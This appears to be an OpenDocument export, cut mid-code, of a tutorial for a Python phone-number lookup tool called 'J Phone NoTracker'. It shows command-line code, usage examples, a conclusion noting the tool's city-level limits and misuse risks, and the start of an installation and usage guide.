      <text:p text:style-name="P27"><text:s text:c="8"/># Rate limiting check</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>if not self.check_rate_limit(client_id):</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>return {</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>'success': False,</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>'error': 'Rate limit exceeded',</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>'rate_limit_remaining': 0</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>}</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Sanitize input</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>clean_number = sanitize_phone_number(phone_number)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Basic validation</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>if not validate_phone_number(clean_number):</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>self.logger.warning(f"Invalid phone number format: {phone_number}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>return {</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>'success': False,</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>'error': 'Invalid phone number format'</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>}</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>try:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/># Perform tracking</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>start_time = datetime.now()</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>result = self.tracker.track(clean_number)</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>duration = (datetime.now() - start_time).total_seconds()</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/># Prepare response</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>response = {</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>'success': result.valid,</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>'data': result.to_dict() if result.valid else None,</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>'metadata': {</text:p>
      <text:p text:style-name="P27"><text:s text:c="20"/>'tracking_time_ms': duration * 1000,</text:p>
      <text:p text:style-name="P27"><text:s text:c="20"/>'offline_mode': self.offline_mode,</text:p>
      <text:p text:style-name="P27"><text:s text:c="20"/>'timestamp': datetime.now().isoformat()</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>}</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>}</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/># Log success</text:p>
      <text:p text:style-name="P27"><text:soft-page-break/><text:s text:c="12"/>self.logger.info(</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>f"Tracked {clean_number[:5]}*** for {client_id} "</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>f"({duration*1000:.1f}ms)"</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/># Add rate limit info</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>response['rate_limit_remaining'] = self.rate_limit - len(self.request_log[client_id])</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>return response</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>except Exception as e:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>self.logger.error(f"Error tracking {clean_number}: {e}", exc_info=True)</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>return {</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>'success': False,</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>'error': 'Internal server error',</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>'error_code': 'TRACKING_FAILED'</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>}</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def batch_track(self, numbers: list, client_id: str = "unknown") -&gt; Dict[str, Any]:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>Track multiple phone numbers.</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>Args:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>numbers: List of phone numbers</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>client_id: Client identifier</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>Returns:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>Dictionary with batch results</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>results = []</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>successes = 0</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>for number in numbers:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>result = self.track_phone(number, client_id)</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>results.append({</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>'number': number,</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>'result': result</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>})</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>if result.get('success'):</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>successes += 1</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>return {</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>'batch_id': hashlib.md5(f"{client_id}{datetime.now()}".encode()).hexdigest()[:8],</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>'total': len(numbers),</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>'successful': successes,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>'failed': len(numbers) - successes,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>'results': results,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>'timestamp': datetime.now().isoformat()</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>def get_stats(self) -&gt; Dict[str, Any]:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"""Get tracker statistics."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>return {</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>'cache_size': len(self.tracker.geocode_cache),</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>'offline_mode': self.offline_mode,</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>'total_requests_today': sum(len(reqs) for reqs in <text:soft-page-break/>self.request_log.values()),</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>'unique_clients': len(self.request_log),</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>'supported_countries': len(CITY_CENTERS)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">def main():</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"""Main entry point with command-line interface."""</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>parser = argparse.ArgumentParser(</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>description="Secure Phone Number Tracker"</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>parser.add_argument(</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"phone_number",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>nargs="?",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>help="Phone number to track"</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>parser.add_argument(</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"--offline",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>action="store_true",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>help="Use offline mode only"</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>parser.add_argument(</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"--api-key",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>help="API key for authentication"</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>parser.add_argument(</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"--client-id",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>default="cli_user",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>help="Client identifier for rate limiting"</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>parser.add_argument(</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"--batch",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>help="JSON file containing list of numbers to batch process"</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>parser.add_argument(</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"--stats",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>action="store_true",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>help="Show tracker statistics"</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>parser.add_argument(</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"--verbose",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>"-v",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>action="store_true",</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>help="Verbose output"</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>args = parser.parse_args()</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Initialize tracker</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>tracker = SecurePhoneTracker(</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>api_key=args.api_key,</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>offline_mode=args.offline</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Show stats if requested</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>if args.stats:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>stats = tracker.get_stats()</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>print("\n📊 Tracker Statistics")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>print("=" * 40)</text:p>
      <text:p text:style-name="P27"><text:soft-page-break/><text:s text:c="8"/>for key, value in stats.items():</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>print(f"{key.replace('_', ' ').title()}: {value}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>return 0</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Batch processing</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>if args.batch:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>try:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>with open(args.batch, 'r') as f:</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>numbers = json.load(f)</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>print(f"\n📋 Processing {len(numbers)} numbers...")</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>results = tracker.batch_track(numbers, args.client_id)</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>print(f"\n✅ Batch Complete")</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>print(f" <text:s text:c="2"/>Successful: {results['successful']}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>print(f" <text:s text:c="2"/>Failed: {results['failed']}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>print(f" <text:s text:c="2"/>Batch ID: {results['batch_id']}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/># Save results</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>output_file = f"batch_results_{results['batch_id']}.json"</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>with open(output_file, 'w') as f:</text:p>
      <text:p text:style-name="P27"><text:s text:c="16"/>json.dump(results, f, indent=2)</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>print(f" <text:s text:c="2"/>Results saved to: {output_file}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>except Exception as e:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>print(f"❌ Batch processing failed: {e}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>return 1</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>return 0</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Single number tracking</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>if not args.phone_number:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>parser.print_help()</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>return 1</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Track the number</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>result = tracker.track_phone(args.phone_number, args.client_id)</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/># Display results</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>if result['success']:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>data = result['data']</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>print("\n✅ TRACKING SUCCESSFUL")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>print("=" * 50)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>print(f"📱 Number: {data['raw_number']}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>print(f"🌍 Country: {data['country_name']}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>if data.get('location') and data['location'] != data['country_name']:</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>print(f"📍 Location: {data['location']}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>print(f"📡 Carrier: {data.get('carrier_name', 'Unknown')}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>print(f"⏰ Timezone: {data['timezones'][0] if data.get('timezones') else 'Unknown'}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>if data.get('local_time'):</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>print(f"🕐 Local Time: {data['local_time']}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>if data.get('latitude') and data.get('longitude'):</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>print(f"🗺️ Coordinates: {data['latitude']:.6f}, {data['longitude']:.6f}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>print(f"📊 Number Type: {data.get('number_type', 'Unknown')}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/># Metadata</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>print("\n📈 Metadata")</text:p>
      <text:p text:style-name="P27"><text:soft-page-break/><text:s text:c="8"/>print("-" * 30)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>print(f"Tracking time: {result['metadata']['tracking_time_ms']:.1f} ms")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>print(f"Mode: {'Offline' if result['metadata']['offline_mode'] else 'Online'}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>print(f"Rate limit remaining: {result['rate_limit_remaining']}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>else:</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>print(f"\n❌ TRACKING FAILED")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>print("=" * 30)</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>print(f"Error: {result.get('error', 'Unknown error')}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>if result.get('error_code'):</text:p>
      <text:p text:style-name="P27"><text:s text:c="12"/>print(f"Code: {result['error_code']}")</text:p>
      <text:p text:style-name="P27"><text:s text:c="8"/>return 1</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>return 0</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27">if __name__ == "__main__":</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>sys.exit(main())</text:p>
      <text:p text:style-name="P27">Usage Examples</text:p>
      <text:p text:style-name="P27"># Track a single number</text:p>
      <text:p text:style-name="P27">python complete_example.py +255712345678</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"># Track with verbose output</text:p>
      <text:p text:style-name="P27">python complete_example.py +255712345678 --verbose</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"># Use offline mode only</text:p>
      <text:p text:style-name="P27">python complete_example.py +255712345678 --offline</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"># Batch process numbers from file</text:p>
      <text:p text:style-name="P27">python complete_example.py --batch numbers.json</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"># Show statistics</text:p>
      <text:p text:style-name="P27">python complete_example.py --stats</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P27"># With API key authentication</text:p>
      <text:p text:style-name="P27">python complete_example.py +255712345678 --api-key "your_secret_key"</text:p>
      <text:p text:style-name="P27">Example numbers.json for batch processing:</text:p>
      <text:p text:style-name="P27">[</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"+255712345678",</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"+255752345678",</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"+255222345678",</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"+255242345678",</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"+255712345679",</text:p>
      <text:p text:style-name="P27"><text:s text:c="4"/>"+255712345680"</text:p>
      <text:p text:style-name="P27">]</text:p>
      <text:p text:style-name="P27"/>
      <text:p text:style-name="P38">Conclusion</text:p>
      <text:p text:style-name="Preformatted_20_Text">The J Phone NoTracker project demonstrates the power and limitations of prefix-based phone number geolocation. While it can provide valuable information for legitimate purposes like fraud detection, emergency services routing, and regulatory compliance, it's crucial to understand its limitations:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>1. Accuracy is city-level at best—it cannot pinpoint exact locations</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>2. Number portability means carrier information may be outdated</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>3. Mobile numbers only give country-level location, not city-level</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>4. Ethical and legal considerations are paramount—this technology can easily be misused</text:p>
      <text:p text:style-name="Preformatted_20_Text">The complete implementation provided here follows production best practices with:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Proper error handling and logging</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Rate limiting and authentication</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/><text:s text:c="4"/>• Caching for performance</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Comprehensive testing</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Security hardening</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Clear documentation of limitations</text:p>
      <text:p text:style-name="Preformatted_20_Text">Remember: With great power comes great responsibility. Always use such tools ethically and in compliance with applicable laws.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">How to Use J Phone NoTracker: A Complete Practical Guide</text:p>
      <text:p text:style-name="Preformatted_20_Text">This guide will walk you through installing and using the J Phone NoTracker phone number intelligence tool. We'll cover everything from basic single-number lookups to batch processing and GUI usage, with real examples for Tanzanian numbers.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">1. Installation</text:p>
      <text:p text:style-name="Preformatted_20_Text">Step 1: Clone the Repository</text:p>
      <text:p text:style-name="Preformatted_20_Text">git clone https://github.com/yourusername/j-phone-notracker.git</text:p>
      <text:p text:style-name="Preformatted_20_Text">cd j-phone-notracker</text:p>
      <text:p text:style-name="Preformatted_20_Text">Step 2: Set Up a Virtual Environment (Recommended)</text:p>
      <text:p text:style-name="Preformatted_20_Text">python3 -m venv venv</text:p>
      <text:p text:style-name="Preformatted_20_Text">source venv/bin/activate <text:s text:c="5"/># On Linux/Mac</text:p>
      <text:p text:style-name="Preformatted_20_Text"># or</text:p>
      <text:p text:style-name="Preformatted_20_Text">venv\Scripts\activate <text:s text:c="8"/># On Windows</text:p>
      <text:p text:style-name="Preformatted_20_Text">Step 3: Install Dependencies</text:p>
      <text:p text:style-name="Preformatted_20_Text">pip install -r requirements.txt</text:p>
      <text:p text:style-name="Preformatted_20_Text">Step 4: Create Necessary Directories</text:p>
      <text:p text:style-name="Preformatted_20_Text">mkdir -p logs data/history</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">2. Basic Usage: Single Number Lookup</text:p>
      <text:p text:style-name="Preformatted_20_Text">The main entry point is complete_example.py. To track a single phone number, run:</text:p>
      <text:p text:style-name="Preformatted_20_Text">python complete_example.py +255712345678</text:p>
      <text:p text:style-name="Preformatted_20_Text">Example Output:</text:p>
      <text:p text:style-name="Preformatted_20_Text">✅ TRACKING SUCCESSFUL</text:p>
      <text:p text:style-name="Preformatted_20_Text">==================================================</text:p>
      <text:p text:style-name="Preformatted_20_Text">📱 Number: +255712345678</text:p>
      <text:p text:style-name="Preformatted_20_Text">🌍 Country: Tanzania</text:p>
      <text:p text:style-name="Preformatted_20_Text">📍 Location: Tanzania</text:p>
      <text:p text:style-name="Preformatted_20_Text">📡 Carrier: tiGO</text:p>
      <text:p text:style-name="Preformatted_20_Text">⏰ Timezone: Africa/Dar_es_Salaam</text:p>
      <text:p text:style-name="Preformatted_20_Text">🕐 Local Time: 2025-03-09 14:30:45</text:p>
      <text:p text:style-name="Preformatted_20_Text">🗺️ Coordinates: -6.792354, 39.208328</text:p>
      <text:p text:style-name="Preformatted_20_Text">📊 Number Type: Mobile</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">📈 Metadata</text:p>
      <text:p text:style-name="Preformatted_20_Text">------------------------------</text:p>
      <text:p text:style-name="Preformatted_20_Text">Tracking time: 234.5 ms</text:p>
      <text:p text:style-name="Preformatted_20_Text">Mode: Online</text:p>
      <text:p text:style-name="Preformatted_20_Text">Rate limit remaining: 99</text:p>
      <text:p text:style-name="Preformatted_20_Text">Understanding the Output</text:p>
      <text:p text:style-name="Preformatted_20_Text">Field<text:tab/>Description</text:p>
      <text:p text:style-name="Preformatted_20_Text">📱 Number<text:tab/>The formatted phone number</text:p>
      <text:p text:style-name="Preformatted_20_Text">🌍 Country<text:tab/>Country determined from country code</text:p>
      <text:p text:style-name="Preformatted_20_Text">📍 Location<text:tab/>Geographic region (may be same as country for mobile numbers)</text:p>
      <text:p text:style-name="Preformatted_20_Text">📡 Carrier<text:tab/>Original network operator (may be outdated due to number portability)</text:p>
      <text:p text:style-name="Preformatted_20_Text">⏰ Timezone<text:tab/>IANA timezone of the region</text:p>
      <text:p text:style-name="Preformatted_20_Text">🕐 Local Time<text:tab/>Current local time at that location</text:p>
      <text:p text:style-name="Preformatted_20_Text">🗺️ Coordinates<text:tab/>Approximate city-level latitude/longitude</text:p>
      <text:p text:style-name="Preformatted_20_Text">📊 Number Type<text:tab/>Mobile, Fixed Line, Toll Free, etc.</text:p>
      <text:p text:style-name="Preformatted_20_Text">📈 Metadata<text:tab/>Performance metrics and rate limit info</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:soft-page-break/></text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">3. Command-Line Options</text:p>
      <text:p text:style-name="Preformatted_20_Text">Option<text:tab/>Description</text:p>
      <text:p text:style-name="Preformatted_20_Text">--offline<text:tab/>Use only offline databases (no internet geocoding)</text:p>
      <text:p text:style-name="Preformatted_20_Text">--api-key KEY<text:tab/>Authenticate with an API key (if configured)</text:p>
      <text:p text:style-name="Preformatted_20_Text">--client-id ID<text:tab/>Identify client for rate limiting (default: cli_user)</text:p>
      <text:p text:style-name="Preformatted_20_Text">--batch FILE.json<text:tab/>Process multiple numbers from a JSON file</text:p>
      <text:p text:style-name="Preformatted_20_Text">--stats<text:tab/>Display tracker statistics</text:p>
      <text:p text:style-name="Preformatted_20_Text">--verbose<text:tab/>Enable verbose logging</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">Example: Offline Mode</text:p>
      <text:p text:style-name="Preformatted_20_Text">python complete_example.py +255222345678 --offline</text:p>
      <text:p text:style-name="Preformatted_20_Text">Useful when internet is unavailable or to avoid API rate limits.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">4. Batch Processing</text:p>
      <text:p text:style-name="Preformatted_20_Text">Create a JSON file (e.g., numbers.json) containing an array of phone numbers:</text:p>
      <text:p text:style-name="Preformatted_20_Text">[</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"+255712345678",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"+255752345678",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"+255222345678",</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>"+255242345678"</text:p>
      <text:p text:style-name="Preformatted_20_Text">]</text:p>
      <text:p text:style-name="Preformatted_20_Text">Then run batch mode:</text:p>
      <text:p text:style-name="Preformatted_20_Text">python complete_example.py --batch numbers.json</text:p>
      <text:p text:style-name="Preformatted_20_Text">Output:</text:p>
      <text:p text:style-name="Preformatted_20_Text">📋 Processing 4 numbers...</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">✅ Batch Complete</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="3"/>Successful: 4</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="3"/>Failed: 0</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="3"/>Batch ID: a1b2c3d4</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="3"/>Results saved to: batch_results_a1b2c3d4.json</text:p>
      <text:p text:style-name="Preformatted_20_Text">The results file contains detailed data for each number, including success/failure status and metadata.</text:p>
      <text:p text:style-name="Preformatted_20_Text"/>
      <text:p text:style-name="Preformatted_20_Text">5. Using the GUI</text:p>
      <text:p text:style-name="Preformatted_20_Text">If you prefer a graphical interface, you can launch the Tkinter GUI:</text:p>
      <text:p text:style-name="Preformatted_20_Text">python src/main.py</text:p>
      <text:p text:style-name="Preformatted_20_Text">This opens a dark-themed window where you can:</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Enter a phone number in international format</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Click "TRACK" to get results</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• View detailed information with color coding</text:p>
      <text:p text:style-name="Preformatted_20_Text"><text:s text:c="4"/>• Copy results to clipboard</text:p>
